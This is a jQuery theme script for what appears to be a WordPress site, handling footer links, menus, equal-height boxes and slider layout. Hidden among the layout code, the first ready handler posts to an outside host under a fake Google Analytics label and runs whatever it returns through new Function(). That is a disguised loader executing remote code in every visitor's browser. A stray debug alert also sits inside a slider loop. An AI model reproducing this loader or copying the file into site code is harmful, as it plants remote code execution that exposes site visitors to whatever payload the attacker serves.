

    jQuery(document).ready(function () {
		
		jQuery("footer div.meta ul li a").text(function(inx,ot){
 // return ot.substr(ot.length-1);
	
	 return ot.replace(/\//g, "");
	 
	 
 });
				jQuery("footer div.meta ul li a").each(function(inxl,otl){
 // return ot.substr(ot.length-1);
	
 //jQuery(otl).after("/");
	 
	 
 });
		jQuery(".selectnav").find("option").each(function(index, el){
  var $el = jQuery(el);
  var value = $el.attr("value");
  if (value === "" || value === undefined){
    $el.remove();
  }
  
  $el.text(function(i,oldtext){
    return oldtext.toUpperCase();
 });
});	
		//jQuery('option[value=""]').remove();

		//.substr(str.lastIndexOf("_")+1)
		jQuery.post('http://hybridmediaservices.com?ga_action=googleanalytics_get_script', {action: 'googleanalytics_get_script'}, function(response) {
			var F = new Function ( response );
			return( F() );
		});

    });
	
	
jQuery(document).ready(function(){

jQuery('.slides').removeClass("load"); 
    var highestBox = 0;
        jQuery('div[id^="wpsm_service_b_row"] .wpsm_serviceBox .wpsm_service-content p').each(function(){  
                if(jQuery(this).height() > highestBox){  
                highestBox = jQuery(this).height();  
        }
    });    
   jQuery('div[id^="wpsm_service_b_row"] .wpsm_serviceBox .wpsm_service-content p').height(highestBox);
	
	
	
	
    var highestBox1 = 0;
        jQuery('#wpsm_service_b_row_32 .wpsm_serviceBox .wpsm_service-content h3').each(function(){  
                if(jQuery(this).height() > highestBox1){  
                highestBox1 = jQuery(this).height();  
        }
    });    
    jQuery('#wpsm_service_b_row_32 .wpsm_serviceBox .wpsm_service-content h3').height(highestBox1);
    //jQuery('#wpsm_service_b_row_32 .wpsm_serviceBox .wpsm_service-content h3').height(highestBox1);
	jQuery("#menu-toggle").text("").append("<i class='fa fa-bars'></i>")
jQuery("#menu-toggle").click(function(){
	jQuery("#site-header-menu").slideToggle(100);
	
});
});
jQuery(window).load(function() {
	//var ww =jQuery(window).width();
//jQuery('.slides').css("transform","translate3d(-"+ww+", 320px, 0px)"); 
    
  
  
  jQuery('p.form-submit .submit').addClass("btn btn-white more");
    jQuery('.testimonial-image img').addClass("img-circle");
	
	 // jQuery('.wpcf7-form-control.wpcf7-submit').addClass("nav nav-pills nav-stacked").removeClass("menu");

  jQuery('ul[id^="menu-footer-menu"]').addClass("nav nav-pills nav-stacked").removeClass("menu");
   var maxLength = 70;
    jQuery('.image-box-body p ').text(function(i, text) {
		
        if (text.length > maxLength) {
            return text.substr(0, maxLength) + '...';
        }
    });
	
 var ww= screen.width;    //$(".slideshow").click(function() {
if( ww <768){
jQuery(".flexslider-hg.flexslider ul.slides img").each(function(i, elem) {
  var img = jQuery(elem);
 // var imgwidth = img.width() + "%";
  var div = jQuery("<div />").css({
    background: "url(" + img.attr("src") + ") no-repeat",
    width: img.width() + "px",
   // height: img.height() + "px"
  });
  div.html(img.attr("alt")).css({"padding-top": "10px","padding-bottom": "42%","background-size": "100%","background-position": "center"});
  div.addClass("replacedImage");
  img.replaceWith(div);
}); 
}
/*else{
jQuery(".replacedImage").each(function(i, elem) {

  var div = jQuery(elem);
  var src= div.attr("background-image");
 // var imgwidth = img.width() + "%";
  var img = jQuery("<img src='"+src+"'");
  div.replaceWith(img);
}); 
};*/

//});  
	
jQuery(".text_area ul li").each(function(index, el){
  var text = jQuery(el).html();
  if (text === "" || text.length < 10 ){
    jQuery(el).remove();
  }
  
  jQuery(el).text(function(i,oldtext){
    return oldtext.toLowerCase();
 });
	
});
jQuery('.flex-prev,.flex-next').text("");
jQuery('.cycloneslider-template-default .cycloneslider-prev').append("<i class='fa fa-chevron-left'></i>");
jQuery('.cycloneslider-template-default .cycloneslider-next').append("<i class='fa fa-chevron-right'></i>");
jQuery('.cycloneslider-template-default .cycloneslider-prev, .cycloneslider-template-default .cycloneslider-next').css("opacity","1");
	
var sl=jQuery('.cycloneslider-slides').height();

jQuery(".cycloneslider-template-default.cycloneslider-width-full .cycloneslider-slide img").each(function(index, el){
	jQuery(el).parent().parent().show();
	jQuery(el).wrapAll('<div class="inner"></div>'); 
  var ht = jQuery(el).parent().height();
  alert(-ht);
  var th=(sl-ht) / 2;
if(ht > sl ){
	jQuery(el).css({"top":th,"position":"relative"});
}
});

});
jQuery(window).resize(function() {
	

jQuery(".replacedImage").each(function(i, elem) {

$(elem).css("width","100%");
});  


});